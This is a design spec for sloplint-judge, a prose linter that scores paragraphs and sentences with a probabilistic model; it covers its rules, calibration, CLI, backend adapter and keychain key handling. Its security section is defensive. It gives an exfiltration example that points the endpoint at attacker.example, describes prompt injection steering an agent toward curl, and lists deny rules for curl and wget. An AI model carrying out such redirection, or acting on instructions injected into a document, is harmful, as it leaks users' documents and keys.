# sloplint-judge — spec

A second gem in this repository, with sloplint's shape and a different kind of rule. sloplint's rules are regexes: offline, milliseconds, every note traceable to a pattern. sloplint-judge's rules are questions put to a System One model, one that answers typed questions about a piece of text with calibrated probabilities and never writes prose. A rule here is still data. What changes is that the "pattern" is a question the model can answer and a regex cannot: does this paragraph end on a summary, a moral or a hope, does this sentence tell the stated reader anything new, does it name a thing a reader could look up.

Everything else is sloplint's, used directly rather than copied: the note object, the paragraph break, the markdown blanker, the exit codes, the fixture discipline, the provenance rules. The judge depends on the sloplint gem. sloplint knows the judge by name and nothing more: `sloplint check --judge` tries to load it and says how to install it if that fails. The dependency points one way. This is the shape dspy.rb uses for its provider gems, and it is the whole plugin system: a lazy `require` behind one flag.

This document is the contract. Phase one is what the spike settled and what ships first. Phase two lists the open items with the test each one must pass before it is built.

## What it is and is not

sloplint-judge is not a detector. The spike asked the model whether a careful editor would suspect a language model wrote a sentence, and the answer was wrong in the same direction every time: edited human prose scored as the most machine-written set and current model prose as the least. Detection stays with sloplint, which separates the same sets tenfold with no network call. No rule in this catalog asks who wrote the text.

What the model can do is judge one quality of one unit of prose, in a way that spreads real human writing across levels for reasons a reader can name, and that ranks model prose below human prose in the registers tested. That is what the rules are built on.

## Terms

- **System One model.** A model that answers typed questions about a state object with probabilities and never writes text. Jev, from TypeSafe, is the first one. The adapter section says how another is plugged in.
- **noul.** A yes-or-no question answered with a probability.
- **choice.** One option from a fixed set, with a probability per option.
- **score.** An ordered set of levels, each described as a situation with examples, with a probability per level.
- **unit.** What a rule looks at: a paragraph or a sentence.
- **register.** Who the reader is, stated in words. Every question carries it, because the same sentence is news to one reader and filler to another.

## The one test for every rule

The bar has two halves, and they do different jobs. A rule ships when a reader shown a flagged unit agrees it should go, whoever wrote it. That is the fixtures: each rule's `examples_bad` must be sentences or paragraphs where a person would agree the flag is fair, and the flag has to be fair on its face, not fair because a model wrote it. Slop is bad writing, and a habit is not excused by being common in human prose; an opening that announces the topic is dead weight to the reader whether a model or a postdoc put it there. The other half, whether the thing flagged ranks current model prose below human prose in the registers the tool is for, is measured with the calibration script below, and it sets severity, not whether the rule exists. The rank statistic is taken over every unit, so a rule whose flag is rare barely moves it: most units sit on the clean side for both authors, and how surely they sit there decides the order. For such a rule the count of flagged units per side, which the script prints next to it, is the number the entry quotes. A rule that separates in every register on the list is a tell and carries `warning`. A rule that reverses in a register on the list, flagging human prose there more often than model prose, is a bad habit humans share, and it carries `info`, with the number printed in its entry, because an agent acting on every `warning` should be fixing what marks a draft as machine-written before it starts on what marks it as ordinary.

"The registers the tool is for" is a closed list, because a rule that holds in one and reverses in another is a real finding about the rule, not noise: engineering prose (design documents, incident reports, reference documentation, standards), news, and academic abstracts. Forum comments are not on the list and are not calibrated. A rule whose flag is not fair on its face, one that measures genre or a reader's taste rather than something the reader would cut, does not ship however well it separates; `commitment` and `stake` went that way. A rule that reverses and whose hits were never read for fairness does not ship either; `order` is in the graveyard on those terms, and `redundancy` had its reading and turned out to measure a news convention.

"Current model prose" means the models people are drafting with now, not the models a public corpus happened to sample. The next section says why that distinction cost us a section.

## Calibration corpus: RAID, plus current models on RAID's own titles

RAID is the standing corpus for both linters: eight domains of human prose written before language models, each title paired with model generations, fetched on demand and never committed. Its one gap is that the model side is GPT-4, llama-chat and mistral-chat, all sampled in 2023, and the rules are meant for the prose models write today. `script/calibrate generate MODEL` closes that gap in place: every RAID row carries the prompt its generation was written to, and the script writes a generation from a current model for each sampled prompt into `.corpus/raid/generated/MODEL/`, same domains, same titles, so the human pairing holds. The models are whatever is current when the script runs, named in the commit message that reports the numbers. Nothing generated is committed. `script/calibrate run` scores the first two paragraphs of three or more sentences in each text and their sentences, so a sentence tell that lives in one- and two-sentence paragraphs, which model news is mostly made of, is under-counted there; `check` sends those paragraphs to the sentence rules, and a rule whose numbers came from a scan of every sentence says so in its entry.

That is the whole calibration corpus. Earlier readings against Hacker News comments and IETF RFCs are retired: comments are not a register the tool is for, and RFCs paired against generated design documents were two genres, not a pair. The engineering register stays what it is for sloplint's regex rules, a reading discipline (CLAUDE.md), not a calibration gate. RAID is the floor for false positives; the generated side is the evidence about current models.

## Packaging: two gems, one repository, one plugin

```
sloplint.gemspec              lib/sloplint/**  minus lib/sloplint/judge*   exe/sloplint
sloplint-judge.gemspec        lib/sloplint/judge.rb  lib/sloplint/judge/**   exe/sloplint-judge
                              add_dependency "sloplint", "~> 0.9"
```

Release order follows the dependency: `sloplint` 0.9.0 is pushed to rubygems.org first, and `sloplint-judge` 0.1.0 after it resolves there, since the judge gemspec requires `sloplint ~> 0.9` and a `gem install sloplint-judge` in between would fail. Each gem is built from the repository root, because both gemspecs resolve their file lists against the working directory.

The core gemspec's file glob rejects `lib/sloplint/judge*` and `exe/sloplint-judge`, so a plain `gem install sloplint` ships no judge code and no broken executable. The judge gemspec globs only its own tree and `docs/JUDGE.md`. Each gem has its own version file and its own CHANGELOG section, and `gem build` runs twice in CI.

The Claude Code plugin does not change shape. One marketplace entry, one `plugin.json`, plugin root at repository root, so both executables reach `lib/` with `require_relative` and the plugin cache has everything. A second marketplace entry pointing at the same root is a two-line change if anyone ever wants sloplint without the judge; a subdirectory plugin was ruled out because the plugin cache copies only that subdirectory, and the judge needs sloplint's code, not just its output.

Consequences for sloplint's own spec, applied in the same commit that adds the gemspec: the line "no plugin system (YAGNI)" goes, replaced by a sentence describing the lazy require; the offline promise reads "offline, unless `--judge`"; and exit 3 joins the contract for that flag only.

## CLI surface

Two ways in, one engine.

```
sloplint check --judge [check options] [paths...]
```

sloplint's own `check`, with the judge loaded when the flag is set. The load is `require "sloplint/judge"` through the load path. `exe/sloplint` puts its own `lib/` first, so from the plugin tree the judge files in that tree are found before any installed gem, and outside it the installed sloplint-judge gem is found. The rescue catches `LoadError` only when the missing path is the judge's own, prints "install the sloplint-judge gem", and exits 2. Otherwise the regex notes and the judge notes for each path are merged by line and emitted as one array.

The other `check` options apply to both linters, and each one costs something in `cli.rb`:

- `--markdown` blanks twice, once inside `Engine.scan` as today and once in the judge, because the engine keeps the raw source for each note's `context` window and a pre-blanked text would put runs of spaces where the code and URLs were.
- `--select` and `--ignore` take ids and categories from either catalog. Unknown-reference checking runs against the union of the two catalogs when `--judge` is set, and each linter is then handed only its own rules. This means the judge `Rule` answers `confidence` like sloplint's does; the rule model below says how.
- `--strict` runs sloplint's low-confidence rules, runs the judge's sentence rules on every sentence, and keeps the judge's low-confidence notes.

That is a small change to how `cli.rb` validates and partitions rules and none to `engine.rb`. The regex engine never sees a judge rule.

```
sloplint-judge [GLOBAL] <command> [ARGS]

commands:
  check          scan paths (or stdin) and report judge notes only   [default command]
  compare A B    which of two passages a plain-prose editor keeps
  rules          list the judge's rule catalog (human or --json)
  explain ID     print one rule's question, levels, examples, and rationale
  version        print version

global options:
  -o, --output-format  full | json   (default: full)
  --backend NAME       which adapter to use (default: from SLOPLINT_JUDGE_BACKEND, else jev)
  --register TEXT      who the reader is (default: "an engineer on the team reading a design document")

check options:
  paths ...            files to scan; "-" or no paths reads stdin
  --markdown           skip fenced/inline code spans, HTML comments, and URLs
  --select IDS         only run these rules (comma-separated ids or categories)
  --ignore IDS         skip these rules
  --strict             run every rule on every unit, and keep low-confidence notes

compare options:
  --drift              also ask whether B changes what A says (sentence rewrites)
```

The judge's own executable exists for `compare`, `rules` and `explain`, which have no home in sloplint's CLI, and for running the judge alone. Its `check` takes paths the way sloplint's does, so `sloplint-judge draft.md` and `cat draft.md | sloplint-judge --markdown -o json -` both work.

`--register` and `--backend` are the two flags sloplint does not have, and `sloplint check --judge` accepts both. Every rule's question is written against a reader, and the default is the reader the tool is usually pointed at. The value is prose, not a code, so `--register "a newcomer reading the README"` works without a table to look it up in.

## Exit codes

sloplint's three, plus one.

| code | meaning |
|------|---------|
| 0    | ran, **no notes** |
| 1    | ran, **notes found** |
| 2    | bad arguments / usage error, empty input, judge gem not installed, or judge not configured (no key, unknown backend name) |
| 3    | backend failure: network down, non-200, malformed answer |

Exit 3 writes nothing to stdout, from either executable. Under `sloplint check --judge` that means the regex notes are withheld too: a caller that asked for both and got one would read it as a clean judge run, which is the one lie the exit codes exist to prevent. A caller that wants sloplint's notes regardless runs plain `sloplint check` and `sloplint-judge check` as two commands.

## Note (the diagnostic object)

Identical to sloplint's, field for field. One flagged unit = one Note. JSON output is an array of these, or an object keyed by path when several files are scanned, and whenever the judge ran it is wrapped: `{"notes": <that>, "judge": {"backend", "requests", ...token counts, "cost_usd"}}`. The judge costs money, so its output says what it spent; the same line goes to stderr for the human format. Jev returns token counts and no price, so the adapter computes the dollars from TypeSafe's public price: $42 per billion input tokens, output tokens free.

```json
{
  "path": "draft.md",
  "line": 40,
  "column": 30,
  "severity": "warning",
  "confidence": "high",
  "rule": "wrap-up",
  "category": "paragraph",
  "message": "Paragraph ends on a summary, a moral or a hope.",
  "excerpt": "Together, these factors make the migration worth the cost.",
  "context": "…rollback took four minutes. [Together, these factors make the migration worth the cost.]",
  "rationale": "A paragraph that closes on a summary of itself tells the reader nothing they did not have one sentence earlier. Human prose in this register closes on a fact or a consequence; model prose closes on a moral.",
  "suggestion": "Cut the last sentence, or end on the number."
}
```

The differences are in where the values come from, not in the shape.

- `severity` is fixed per rule, as in sloplint: what the construct costs the prose.
- `confidence` is the lower of two things: the rule's own `confidence`, fixed per rule as in sloplint, and the band the model's confidence for this answer falls in. At or above 0.7 is `high`. Between 0.5 and 0.7 is `medium`. Below 0.5 is `low`. A note whose model band is `low` is dropped from the default run the way a low-confidence sloplint rule is; `--strict` keeps it. The rule's own `low` only caps what the note reports: a low rule runs only when `--select` or `--strict` asked for it, and then its notes come through at `low`. The bands are provisional. They were measured on `compare`, where swapping the passage order gives a direct test of whether an answer holds (across 1,058 pairs, nothing at or above 0.7 flipped and below 0.5 one answer in nine did). A score question about one passage has no order to swap, so the bands for `check` are borrowed until the stability run in phase two measures them on the questions they gate.
- `line`, `column`, `excerpt` and `context` point at the unit. For a paragraph rule the excerpt is the sentence the rule is about (the last sentence for `wrap-up`, the first for `throat-clearing`, the whole paragraph for `particulars`) so that the note lands where the fix goes. `column` is the sentence's real start on its line, and `line` counts every line of the file as written: the splitter drops headings, bullets and table rows from what it hands the rules, but it keeps each sentence's byte offset into the original text, and the note is built from that offset the way sloplint's is from a match offset.
- `count` is never present. No rule counts.
- The raw probability vector is not on the note. A consumer that wants it runs `explain` for the levels and `check -o json --strict` for every note, or uses the calibration script, which reports probabilities directly. Keeping the note shape identical to sloplint's is worth more than one extra field.

## Rule model

A rule is data. `rules.rb` holds an array of `Rule` objects built with `Data.define`:

```ruby
Rule = Data.define(
  :id, :category, :unit, :severity, :confidence, :question, :flag, :message, :suggestion,
  :examples_bad, :examples_ok, :rationale
)

RULES = [
  Rule.new(
    id:       "wrap-up",
    category: "paragraph",
    unit:     :paragraph,                  # :paragraph or :sentence
    severity: "warning",                   # error, warning, info -- cost to the prose
    confidence: "high",                    # high, medium, low -- ceiling on the note's confidence
    question: {
      type: "score",
      instructions: "How does this paragraph end, for %{register}?",
      criteria: [                          # ordered low to high; high is what the editor prefers
        { what: "It closes by restating what the paragraph already said, or by drawing a moral from it.",
          examples: ["In short, the migration paid for itself.", "This shows why careful planning matters."] },
        { what: "It closes on a transition, a question, or a promise of what comes next.",
          examples: ["The next section covers the rollback.", "Whether that holds under load is another matter."] },
        { what: "It closes on a fact, a number, or a consequence the reader did not have yet.",
          examples: ["Rollback took four minutes.", "Two of the three replicas never received the write."] }
      ]
    },
    flag:     { level: 0 },                # most likely level is 0 -> note
    message:  "Paragraph ends on a summary, a moral or a hope.",
    suggestion: "Cut the last sentence, or end on the number.",
    examples_bad: ["..."],                 # paragraphs the rule must flag
    examples_ok:  ["..."],                 # paragraphs it must not
    rationale: "..."
  ),
  # ...
]
```

`question` is the System One question, verbatim in the shape the adapter sends. `%{register}` is interpolated from `--register`. `flag` says which answer makes a note: `{ level: 0 }` for a score, which is the only question type a rule flags on today; a first noul rule adds `{ yes: true }` and the branch that reads it. There is no threshold on the probability itself, only on the most likely answer and the model's confidence, because a threshold is a number nobody can defend and the confidence gate already does the job.

`confidence` on the rule means what it means in sloplint, how likely a flag is a false positive, and it is a ceiling: a note's confidence is the lower of the rule's and the model's band for that answer. A rule at `medium` never produces a `high` note however sure the model is. A rule at `low` stays out of the default run, so `--select`, `--ignore` and `--strict` work on judge rules exactly as they do on sloplint's; `matched-shape` is the one judge rule that sits there.

The engine never grows a branch for a rule. If a rule needs logic, the question is wrong, not the engine. That is sloplint's rule and it holds harder here: a question the model cannot answer from the text in front of it is a question that should not be asked.

### Fixtures are live

`examples_bad` and `examples_ok` are run against the backend by the spec, one request per fixture, and the most likely level must land on the flagged side or off it. This needs a key, so the fixture spec skips itself with a message when none is set. Everything else in the suite (splitting, note assembly, the CLI, exit codes, the adapter's serialisation) runs offline against a fake backend that returns what it is told. A rule with no fixtures does not load.

Fixtures are synthetic, as in sloplint. No sentence read during calibration is pasted into the repository.

## Rule catalog (v1)

Fourteen rules, two categories. A number appears only where it decides something a reader can see in the rule: its severity, its confidence ceiling, or a caveat. It is the probability that a model unit scores higher than a human one in the same register; below 0.5 means the rule ranks model prose lower, which is what a rule is for. The full runs, with corpus sizes and the models on each side, are in the commit that added or last changed the rule.

### paragraph

Run on every paragraph of three or more sentences. One request per paragraph carries every paragraph question in the run, five by default.

- **particulars** (`warning`, `high`). How much of the paragraph is a fact, name, number, step or quote a reader could check: none of it, some of it, most of it. Flags at none. Ranks model prose lower in every register the tool is for, against 2023 models and current ones.
- **wrap-up** (`warning`, `high`). How the paragraph ends: restating, moralising or hoping, transition, or new fact. Flags at the first. The hope is the "despite these challenges, the future looks bright" closer, which names nothing and so tells the reader nothing new.
- **throat-clearing** (`info`, `high`). How the paragraph begins: a general announcement of the topic, a framing sentence, or a particular. Flags at announcement. Ranks model prose lower in news and engineering prose, and reverses in abstracts, where human authors open by announcing the paper: 0.59 against current models, 0.63 to 0.93 against 2023 ones. It ships because the flag is fair whoever wrote the paragraph, and it is `info` because the reversal is on the list.
- **self-narration** (`info`, `medium`). Whether the paragraph says something about its subject or signposts the document: most sentences tell the reader what the text will do, is doing or has done, or the paragraph carries facts, decisions, rules or events with at most one signpost. Two levels. Flags at signposting. `throat-clearing` is the first sentence only; this is the paragraph that is a table of contents in prose. The flag is rare, so the counts are the number: in 30 abstracts, 1 human paragraph against 32 for llama-chat, 4 for GPT-4 and 49 for Claude Sonnet 5; in news nothing on either side; in 34,000 words of READMEs and design documents nothing. The rank statistic sits at 0.45 to 0.78 in abstracts because human abstracts carry the one-sentence "in this paper we" signpost that does not flag, and `info` because abstracts and the introductions to standards signpost by convention.
- **promotional** (`warning`, `medium`). How the paragraph evaluates its subject: every evaluative word favorable with nothing measured and no drawback, or evaluation absent, measured, or with a cost in the same paragraph. Two levels. Flags at the first. The regex catalog's `puffery-words` sees the watch words, which age out with each model release; this is the paragraph that is positive without any of them. Ranks model prose lower in news (0.12 to 0.27) and abstracts (0.09 to 0.45); no human paragraph flagged in either register, against 7 to 17 of about 30 model paragraphs in news and 1 to 9 in abstracts. One hit in 34,000 words of READMEs and design documents, on a paragraph that was selling.
- **same-weight** (`info`, `low`). Whether the paragraph marks which of its sentences are facts, which are inferences and which are the writer's opinions: none marked, some marked, or all marked (or nothing to mark, because the paragraph is only facts, steps or events). Flags at none. Ranks model prose lower in news (0.26 to 0.38) and, against 2023 models, in abstracts (0.16 to 0.38); against Claude Sonnet 5 abstracts sit at 0.52. Off by default: a design document states its decisions in flat sentences on purpose and gives the reason a paragraph later, and read against READMEs and design documents about one hit in six was fair. `--select same-weight` or `--strict` runs it.

### sentence

Run on every sentence of the paragraphs a paragraph rule flagged, and on the sentences of the short paragraphs no paragraph rule looked at, so the expensive questions are asked where the cheap ones found something and no paragraph goes unexamined. Two details keep that shortcut honest. A paragraph is "flagged" only by a note that survives the confidence bands; a paragraph answer that fell to `low` and was dropped opens nothing. And when the run contains no paragraph rule at all, because `--select` named only sentence rules or `--ignore paragraph` removed them, the sentence rules run on every sentence, since there is nothing to triage by and a silent clean exit would be a lie. `--strict` runs them on every sentence regardless. One request per sentence carries every sentence question in the run, six by default, with the sentence's paragraph and its index in the state so the model sees the neighbours.

- **stock-figure** (`warning`, `high`). The sentence uses a figure of speech that is stock, a figure that is the writer's own, or no figure. Flags at stock.
- **no-news** (`warning`, `high`). For the stated reader, the sentence explains what they already know, states what they could have guessed, or tells them something new. Flags at explains-known.
- **names-nothing** (`warning`, `high`). The sentence names nothing, names a kind of thing, or names a thing a reader could look up. Flags at names-nothing. This is the concreteness dimension from the spike, renamed to say what the flag means.
- **ends-on-verdict** (`info`, `high`). The sentence ends on a verdict or moral, trails off on a qualifier, or ends on the fact that carries it. Flags at verdict.
- **trailing-gloss** (`info`, `medium`). The sentence ends on a comma and an -ing clause that interprets the fact before it (highlighting, reflecting, underscoring), or it does not: no such clause, or one that adds a fact or a consequence. Two levels, so the score is the probability of the gloss and nothing else. Flags at the first. The regex catalog's `trailing-significance-participle` sees a short list of verbs; this is the reading of what the clause does. Ranks model prose lower in abstracts (0.32 against Claude Sonnet 5, 0.42 to 0.47 against 2023 models) and higher in news (0.60 to 0.73), where human sentences carry more trailing clauses of every kind and so a little more gloss probability across the bulk that never flags; the flags themselves run the other way, 4 human sentences in 30 articles against 18 for GPT-4 and 8 for Claude Sonnet 5. `info` because of that reversal, `medium` because the question has two parts.
- **unnamed-authority** (`info`, `medium`). Who the sentence attributes its claim to: an authority the reader could not find and that speaks for nobody in particular (experts, studies, research, critics, pundits, many, some, it is widely believed), or a named person, body, document or dataset, a source that speaks for a body and the register quotes by convention (officials, a spokesperson, the company, a court), prior work in an abstract, or the sentence's own voice. Two levels. Flags at the first. The regex catalog's `vague-attribution` sees three fixed frames; this is the reading of who is being cited. In news, at the confidence `check` reports, human sentences flag at 1 in 200 and model sentences at 4 to 5 in 100, most of them in the one- and two-sentence paragraphs model news is made of, which `script/calibrate` does not score; in abstracts neither side reaches 2 in 100, because prior work is let through. `info` because the human hits it does find ("it was widely believed", "as had been widely expected") are the convention at its loosest, not a fabrication.
- **stated-stakes** (`info`, `low`). Whether a sentence that says something matters (crucial, vital, essential, key, matters) says why: it gives no fact, number or consequence, or it gives one, points to where it is, has it in the sentence right after, makes no importance claim (a rule, a requirement or a signpost is not one), or is quoted speech. Two levels. Flags at the first. Off by default: in news the model puts nearly every hit at low confidence, 4 in 100 GPT-4 sentences and 2 in 100 Claude Sonnet 5 sentences against 1 in 200 human under `--strict`, and one or two a side at the confidence `check` reports; and human abstracts state the stakes of their problem by convention, 4 in 243 against 4 in 163 for GPT-4 and none for Claude Sonnet 5. Read against 34,000 words of READMEs and design documents it made one hit, a fair one. `--select stated-stakes` or `--strict` runs it. It sits on the same sentence as `ends-on-verdict` about one time in ten.
- **matched-shape** (`info`, `low`). A matched pair or triple shaped the content, a list the content needed, or no matched structure. Flags at shaped-the-content. Off by default: near 0.5 against 2023 models and strong against current Claude models, so a tell of one model family, and read against real READMEs most hits were captions and parallels the writer built on purpose. `--select matched-shape` or `--strict` runs it.

Each sentence rule reports on its own. There is no combined score and no threshold that combines them.

### Graveyard

Tested, not shipped, kept here so nobody tests them again without new evidence. The reason is in words; the runs are in the spike's commits.

- **claim-count**: one claim, two yoked, or none. No separation in any register.
- **commitment**, **stake**: measure whether the writer has a stake. Measure genre, not quality: an abstract has no stake and should not.
- **redundancy**, **order**: rank model prose lower in one register on the list and higher in another, and the spike never read their hits for fairness. `order` comes back only with that reading, at `info`. `redundancy` had it, as `restatement` ("before its last sentence, does this paragraph say anything twice"), and is back here: it reverses in news against every side, 2023 models and current, because a news paragraph leads with the fact and then gives the quote that says it, and the model reads that as saying it twice; abstracts are a coin flip; and 34,000 words of READMEs and design documents gave no hit at all. It measures a news convention, not padding.
- **glue**, **fat**, **unresolved**, **paragraph-role**: below the gating bar in the six-register test or never reached it.
- **owned-claim**, retried as **no-actor** ("in this paragraph, who does things"): a paragraph in which decisions get made and concerns get raised with nobody named. The rank statistic leans the right way (0.26 to 0.44 in news and abstracts against every side) and no paragraph on any side ever crosses the flag at the confidence `check` reports: 0 of about 30 human and 0 of 20 to 46 model paragraphs per side in both registers, and 0 hits in 34,000 words of READMEs and design documents. A gradient the model never commits to is not a rule; it costs a question per paragraph and reports nothing.
- **buried-verbs** ("in this paragraph, are the actions verbs or nouns"): the paragraph-level reading of the nominalization shift Reinhart et al. measure, tried because a suffix count cannot tell a field term from a buried verb. Same shape as `no-actor`: the rank statistic is the strongest in the series in news (0.13 to 0.25 against every side) and flat in abstracts, and at the confidence `check` reports it flagged 0 human and 1 model paragraph in news and 1 human against 0 to 3 model paragraphs in abstracts, with "all the actions are nouns" and again with "most of them"; 0 hits in 34,000 words of READMEs and design documents. Current models nominalize more than people do and still not enough, paragraph by paragraph, for a reader to point at one. **hedge** was on this line, and came back reframed: not "does the paragraph hedge" but "does it say which sentences are guesses", which is `same-weight` above.
- **machine-written**: the guard. Measures abstraction, not authorship, and gets it backwards.

## Splitting

Paragraphs are separated by sloplint's `PARA_BREAK`, and `--markdown` uses sloplint's blanker with one change: fenced code and HTML comments become spaces before splitting, as in the regex engine, but an inline code span or a URL becomes a run of placeholder letters of the same length, because it is a word in its sentence. Blanked to spaces, a paragraph that opened with a code span lost its head and a sentence boundary followed by one merged two sentences; the placeholder keeps both, and a line that is only code or a bare link counts as furniture. On top of that the judge drops headings, list items, table rows, block quotes and reference lines, because a heading is not a paragraph and a bullet is not a sentence. Sentences are split on terminal punctuation followed by a space and a capital or an opening quote, with a short list of abbreviations that do not end a sentence. This is the splitter the spike used, with one addition: every paragraph and sentence it returns carries its offset into the original text, so a note can be placed on the file as written after the furniture is gone. It lands in the core gem as `Sloplint::Split`, a public module the regex engine does not call, because the reader-test skill needs the same splitter and two consumers make it core's to own. A paragraph with fewer than three sentences is skipped by the paragraph rules and goes straight to the sentence rules, so a README written in two-sentence paragraphs is still examined. Splitting runs on the blanked copy, but every text the splitter returns is cut from the original at the same offsets, so an excerpt is always a string that is in the file, code spans and URLs included. Furniture is blanked line by line, so a list bound tight to the paragraph above it takes only its own lines out.

## Backend adapter

The engine depends on one interface and ships one implementation. Everything it knows about the model lives behind it.

```ruby
module Sloplint::Judge
  module Backend
    # state:     Hash, the object the questions are about
    # questions: Hash of name => { type: "noul" | "choice" | "score", instructions: String, criteria: ... }
    # returns:   Hash of name => Answer
    def ask(state, questions); end

    # A short, stable string: "jev-latest".
    def name; end

    # Optional. Dollars for a summed usage Hash, from the backend's list
    # price. Reported as "cost_usd" when defined.
    def cost_usd(usage); end
  end

  Answer = Data.define(:type, :probabilities, :confidence, :usage)
  # probabilities: for noul, a Float; for choice, a Hash keyed by criterion name; for score, an Array low to high.
  # confidence:    Float in 0..1.
  # usage:         Hash, whatever the backend counts (Jev: input_tokens, output_tokens), summed into the "judge" block; may be empty.
end
```

The engine never reads a backend's raw response. It calls `ask`, receives `Answer`s, and applies each rule's `flag` and the confidence bands to those. A new backend is a class that answers `ask` and `name`, and one line in the backend table.

### What a backend must honour

- **Three question types**, with the answer shapes above. A backend that lacks one refuses the rules that need it, with a message naming them, rather than approximating.
- **Choice criteria are a dictionary**, keyed by option name. Jev returns 422 on an array.
- **Score levels are ordered and described as situations**, each `{what, examples}`, low to high, and the answer vector keeps that order.
- **Several questions per request.** All rules of one unit go in one request. A backend that takes one question per call fans out inside `ask` and reports the summed usage.
- **A confidence per answer.** Without it the bands cannot run. A backend with no native confidence must return one it can defend, for instance the margin between the top two probabilities, and every note's provenance is checked per backend by the calibration script before that backend is trusted.
- **State is opaque to the backend.** The engine puts the register, the paragraph, the sentence index and the passages in the state. A backend serialises it and does not interpret it.

### The Jev adapter

Default backend. `POST https://api.typesafe.ai/v1/systemone` with body `{state, model, questions}`. Questions pass through verbatim, because the rule's question shape is Jev's. Response `answers.<name>.{probabilities, confidence}` and `usage.input_tokens` map onto `Answer` directly.

Configuration is from the environment, plus the OS keychain for the key. There is no configuration file.

| variable | default | meaning |
|---|---|---|
| `SLOPLINT_JUDGE_BACKEND` | `jev` | which adapter class to load |
| `SYSTEMONE_URL` | `https://api.typesafe.ai/v1/systemone` | endpoint; must be `https` on a `typesafe.ai` host, anything else is a usage error (exit 2) |
| `SYSTEMONE_MODEL` | `jev-latest` | model name sent in the body |
| `TYPESAFE_API_KEY` | none, required | bearer key; from the environment, else the keychain item `key set` wrote |
| `SLOPLINT_JUDGE_CONCURRENCY` | `8` | parallel requests |

### Where the key lives

The adapter looks for the key in the environment first and then in the OS store: the login keychain on macOS, read with `/usr/bin/security`, or libsecret on Linux, read with `secret-tool` from `/usr/bin` or `/usr/local/bin` (a fixed list, not `PATH`). The item is service `sloplint-judge`, account the backend's `KEY`, which for Jev is `TYPESAFE_API_KEY`; `status`, `key set` and `key unset` act on the key of the backend selected with `--backend` or `SLOPLINT_JUDGE_BACKEND`. `sloplint-judge key set` writes it by handing the terminal to the platform tool, which prompts for the value itself, so the key is never in any process's argument list, in shell history or in Ruby; it refuses to run without a terminal, which is also why the check skill can never run it. `sloplint-judge key unset` removes the item. A read that gets no answer in 15 seconds is killed and reported as a usage error, because on macOS an item whose access list does not trust `security` opens an Allow/Deny dialog that nobody sees under an agent. A value with a control character in it is refused without being printed: Ruby's HTTP library rejects such a header with an error message that quotes the whole value.

The raw commands, for anyone who would rather not use `key set`:

```bash
security add-generic-password -U -s sloplint-judge -a TYPESAFE_API_KEY -w   # macOS; prompts. Never add -A.
security find-generic-password -s sloplint-judge -a TYPESAFE_API_KEY        # is it there? (no -w, no value shown)
security delete-generic-password -s sloplint-judge -a TYPESAFE_API_KEY
secret-tool store --label=sloplint-judge service sloplint-judge account TYPESAFE_API_KEY < keyfile   # Linux
secret-tool clear service sloplint-judge account TYPESAFE_API_KEY
```

What this protects: the key is not in a dotfile, not in the environment the agent's shell commands inherit, and not in the transcript unless a process asks the keychain for it on purpose. What it does not: the item is created by `security`, so its default access list trusts `security`, and any process running as you reads it with one command and no prompt; on Linux the same holds while the session keyring is unlocked. Two ways to tighten that, neither the default: create the item with `-T ""` and macOS asks Allow/Deny on every read, a per-run consent prompt the agent cannot answer, at the cost of a dialog per `--judge` run that "Always Allow" undoes; or keep the key in a secret manager and run under `op run` or the like. Never use `-A`, which marks the item readable by every application without warning. An item that keeps prompting after `key set` was created by another application and kept its access list through `-U`; delete it and run `key set` again. None of this reaches a Cowork cloud session, whose sandbox cannot connect to `api.typesafe.ai` at all.

`sloplint-judge status` answers whether a run could happen here: `https` endpoint on a `typesafe.ai` host, and a key in the environment or the keychain. It checks that the item exists without reading its value, so the probe pulls no secret into any process, and it exits 2 with the same message `check` would give when nothing is configured.

### Where the text can go

The key and the whole document go to `SYSTEMONE_URL`, so the adapter accepts only an `https` URL on `api.typesafe.ai` or another `typesafe.ai` host. Without that pin, `SYSTEMONE_URL=https://attacker.example sloplint check --judge FILE` would be a valid way to run the one command an agent is allowed to run, and a line of injected text in the document is all it would take to set it. With the pin, the sanctioned command has no way to send the text anywhere else; whatever else an agent's shell can do is the shell's business, not the judge's.

What the judge cannot fix is that shell. In Claude Code the agent that runs `sloplint check --judge` also has general Bash, so an instruction hidden in a document could still reach for `curl`. The judge keeps its own surface small: Jev answers with probabilities and a confidence, never free text, so nothing the model says reaches the agent as words, and the only document text that comes back is each note's `context`, about forty characters either side of the match. Anyone who wants a harder line draws it in Claude Code's own settings, for example `permissions.deny` entries for `Bash(curl *)` and `Bash(wget *)`, or a subagent of their own with a PreToolUse hook that allows one command. A plugin cannot ship that clamp: plugin subagents can drop tools, not restrict Bash to one command line.

### Adding a backend

1. Write a class under `lib/sloplint/judge/backends/` that answers `ask` and `name`, and `cost_usd(usage)` if the backend has a list price. Give it a `KEY` constant naming the environment variable its key lives under, which is also its keychain account under the `sloplint-judge` service, so two backends' keys are two items; and a class method `configured!` that checks its endpoint settings without reading the key, raises `ArgumentError` when they are wrong, and returns a short description for `status`. The constructor takes `key: nil` and resolves it through `Secret.fetch(KEY)`.
2. Add its name to the backend table.
3. Run `script/calibrate` against the corpus described above: RAID's human side against both its 2023 generations and a current-model side generated from the same prompts. It reports, per rule, register and model side, the probability that the model unit scores higher than the human one, and how many units on each side it would have flagged at the confidence `check` reports; the flip rate under passage-order swap at each confidence band for `compare`; and the agreement rate between two runs of the same units at each band for `check`. A backend is usable when `no-news` and `names-nothing` sit below 0.5 in every register on the list against the current-model side, the `compare` flip rate at or above 0.7 confidence is under 1 percent, and the `check` agreement rate at or above 0.7 is at least 90 percent. If a backend's bands differ from Jev's, the confidence thresholds are per backend.

## compare

The pairwise judge from the spike, kept as a second command because the rewrite loop in phase two needs it and nothing in `check` provides it. Two passages, A and B, and a choice question:

> A careful editor who wants prose that is plain, specific and economical, and who distrusts polish for its own sake, must run exactly one of A and B *place*. Which does the editor run?

*place* is the register as a venue: "as the opening of the article", "in an engineering design document read by the team". With `--drift`, a noul rides along: does B state any fact, claim or qualification that A does not, or drop any that A states. Order is randomised per call because the judge has a position bias, and the answer is mapped back before it is reported. Output is `{keep: "A"|"B", p_keep_b: Float, keep_confidence: Float, drift: Float|null, drift_confidence: Float|null}`. Two questions, two confidences; the tool does not collapse them.

The acceptance rule for a rewrite, which the phase-two loop applies and which `compare` only reports: B replaces A only when `p_keep_b >= 0.5`, `drift <= 0.5`, and the lower of the two confidences is at or above 0.7. Gating on the lower one is the point: a choice the model is sure of and a drift answer it barely trusts is a rewrite that may have changed the meaning, which is the one thing drift exists to catch. In the spike the judge kept the human passage in 78 to 98 percent of matched pairs across news and abstracts.

## Known failure mode

